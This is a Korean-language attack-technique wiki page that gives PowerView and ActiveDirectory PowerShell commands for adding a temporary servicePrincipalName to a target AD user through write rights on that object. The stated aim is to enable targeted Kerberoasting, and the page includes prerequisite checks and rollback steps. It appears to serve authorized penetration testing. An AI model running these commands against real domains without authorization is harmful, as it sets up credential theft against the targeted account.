---
tags:
  - 환경/ad
  - 서비스/ldap
시작조건: ["요청자 AD 계정의 Windows 실행 컨텍스트 확보", "공격 대상 사용자 객체 식별"]
필요권한: ["요청자 AD 계정의 공격 대상 사용자 객체 GenericWrite·GenericAll 또는 servicePrincipalName 속성 쓰기 권한"]
필요조건: ["실행 호스트에서 LDAP 접근 가능", "공격 대상 사용자의 기존 SPN 기준값", "고유한 임시 SPN"]
결과: ["공격 대상 사용자 객체에 추적 가능한 임시 SPN 추가", "원복에 사용할 변경 전 SPN 목록"]
---

# 임시 SPN 설정

## 한 줄 판단

현재 Windows 세션의 AD 계정이 공격 대상 사용자 객체의 `servicePrincipalName`을 쓸 수 있으면 변경 전 값을 기록하고 고유한 임시 SPN 하나를 추가해 표적 Kerberoasting의 전제 조건을 만든다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 명령 실행 위치와 네트워크 경로 | PowerView 실행 호스트에서 LDAP 접근 가능 | 현재 호스트·도메인, DNS와 DC 연결 확인 | DNS와 LDAP 접근을 바로잡은 뒤 진행 |
| 현재 계정 또는 인증 수단 | SPN 변경을 요청할 AD 계정의 Windows Identity와 인증 세션 확보 | `whoami`와 LDAP query 성공 확인 | PowerView가 사용할 요청자 실행 컨텍스트부터 준비 |
| 현재 권한 | 요청자 계정이 대상 사용자 객체의 `servicePrincipalName`을 쓸 수 있음 | SID 기준 ACL, deny ACE, 상속과 현재 토큰 확인 | 대상 객체와 실제 ACL 재검증 |
| 공격 대상의 조건 | 대상 사용자와 기존 SPN 값이 식별됨 | `Get-DomainUser`로 변경 전 전체 SPN 기록 | 기존 값을 기록하기 전에는 변경하지 않음 |
| 필요한 파일·목록·주소 | 기존 값과 충돌하지 않는 고유 임시 SPN 준비 | 도메인 내 SPN 충돌 여부 확인 | 다른 서비스 SPN과 겹치지 않는 값 선택 |

## 실행

> 임시 SPN은 대상 사용자의 서비스 인증과 충돌할 수 있다. 기존 multi-value SPN 기준값을 보존하고, 이번에 추가한 정확한 `service/host[:port]` 값 하나만 제거한다.

아래 명령은 `whoami`에 표시되는 현재 Windows Identity로 LDAP 변경을 요청한다. `<TARGET_USER>`는 속성이 변경될 공격 대상이며 요청자 계정과 구분한다.

`<UNIQUE_TEMP_SPN>`은 `service/host[:port]` 형식의 새 값(예: `http/test.directory.example.test:8080`)이며, 기존 servicePrincipalName 값과 충돌하지 않아야 한다. `<TARGET_USER>`는 이 SPN을 받는 sAMAccountName이다.

### 1. 기존 SPN 기준값 확인

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser -Identity '<TARGET_USER>' -Properties serviceprincipalname
```

확인할 출력:

- 변경 전 전체 `servicePrincipalName` 값과 대상 사용자의 식별 정보.
- 기존 값이 있으면 전체 `-Clear`를 사용하지 않고 이번에 추가할 값만 제거할 수단을 준비한다.

### 2. 임시 값 등록

기존 SPN이 없는 대상은 PowerView로 속성을 설정한다.

```powershell
Set-DomainObject -Identity '<TARGET_USER>' -Set @{serviceprincipalname='<UNIQUE_TEMP_SPN>'} -Verbose
Get-DomainUser -Identity '<TARGET_USER>' -Properties serviceprincipalname
```

확인할 출력:

- 공격 대상 사용자에 정확한 임시 SPN 하나가 표시된다.
- 접근 거부가 나오면 요청자 계정의 인증 성공과 대상 객체 SPN 쓰기 권한을 분리해 확인한다.

기존 SPN이 있는 대상에는 `-Set`으로 전체 값을 덮어쓰지 않는다. ActiveDirectory 모듈을 사용할 수 있으면 다중값 속성에 고유 값 하나만 추가한다.

```powershell
Import-Module ActiveDirectory
Get-ADUser -Identity '<TARGET_USER>' -Properties ServicePrincipalName | Select-Object -ExpandProperty ServicePrincipalName
Set-ADUser -Identity '<TARGET_USER>' -ServicePrincipalNames @{Add='<UNIQUE_TEMP_SPN>'}
Get-ADUser -Identity '<TARGET_USER>' -Properties ServicePrincipalName | Select-Object -ExpandProperty ServicePrincipalName
```

`Set-ADUser` 모듈이 없거나 현재 세션의 delegated write가 이 모듈을 통해 적용되지 않으면 기존 SPN이 있는 계정은 이 절차로 변경하지 않는다. 전체 값을 덮어쓰는 PowerView `-Set`으로 대체하지 않는다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| 대상 사용자에 임시 SPN 하나가 표시됨 | SPN 속성 변경 성공 | 표적 TGS 요청 가능 | [[표적 Kerberoasting]] |
| `Access is denied` 또는 LDAP modify 실패 | 현재 요청자에게 SPN 쓰기 권한이 없음 | 객체 미변경 | 대상·요청자 SID, deny ACE, 상속과 현재 토큰 재검증 |
| 기존 SPN이 예상과 다름 | 기준값이 변경됐거나 다른 관리 작업이 개입함 | 변경 중단 | 현재 전체 값을 다시 기록하고 충돌 원인 확인 |

## 확인할 출력과 권한

- LDAP 인증 성공, 대상 객체 식별과 `servicePrincipalName` 변경 성공을 각각 확인한다.
- 임시 SPN이 표시되어도 TGS hash, 대상 계정 비밀번호 또는 대상 계정 권한을 얻은 것은 아니다.
- 요청자 계정은 속성을 변경하는 Identity이고 공격 대상 사용자는 SPN이 추가되는 Identity다.

## 변경 영향과 복구

| 변경 대상 | 예상 영향 | 검증 방법 | 복구 절차 |
|---|---|---|---|
| 대상 사용자의 `servicePrincipalName` | Kerberos 서비스 식별과 운영 서비스에 영향 가능 | 변경 전·후 전체 속성 비교 | 이번에 추가한 고유 값만 제거하고 기준값과 비교 |

기존 SPN이 없었던 대상에서만 다음 명령으로 속성을 비운다.

```powershell
Set-DomainObject -Identity '<TARGET_USER>' -Clear serviceprincipalname -Verbose
Get-DomainUser -Identity '<TARGET_USER>' -Properties serviceprincipalname
```

기존 SPN이 있었고 `Set-ADUser -ServicePrincipalNames @{Add=...}`로 추가했다면 같은 다중값 속성에서 이번 값만 제거한다.

```powershell
Set-ADUser -Identity '<TARGET_USER>' -ServicePrincipalNames @{Remove='<UNIQUE_TEMP_SPN>'}
Get-ADUser -Identity '<TARGET_USER>' -Properties ServicePrincipalName | Select-Object -ExpandProperty ServicePrincipalName
```

- 추가한 `<UNIQUE_TEMP_SPN>`은 없고, 변경 전 전체 SPN 기준값은 그대로여야 복구 완료다. 기준값이 달라졌다면 동시 관리 변경 가능성을 확인하고 임의로 전체 값을 덮어쓰지 않는다.
- 후속 권한이나 그룹 변경을 원복하기 전에 SPN부터 복구한다.

## 관련 공격기법

- [[AD ACL 권한 열거와 공격 경로 식별]]
- [[표적 Kerberoasting]]

## 관련 도구

- [[PowerView]]

## 참고 링크

- [PowerSploit: Set-DomainObject](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/)
- [Microsoft: Set-ADUser ServicePrincipalNames](https://learn.microsoft.com/powershell/module/activedirectory/set-aduser)
- [Microsoft: Service principal names](https://learn.microsoft.com/windows/win32/ad/service-principal-names)
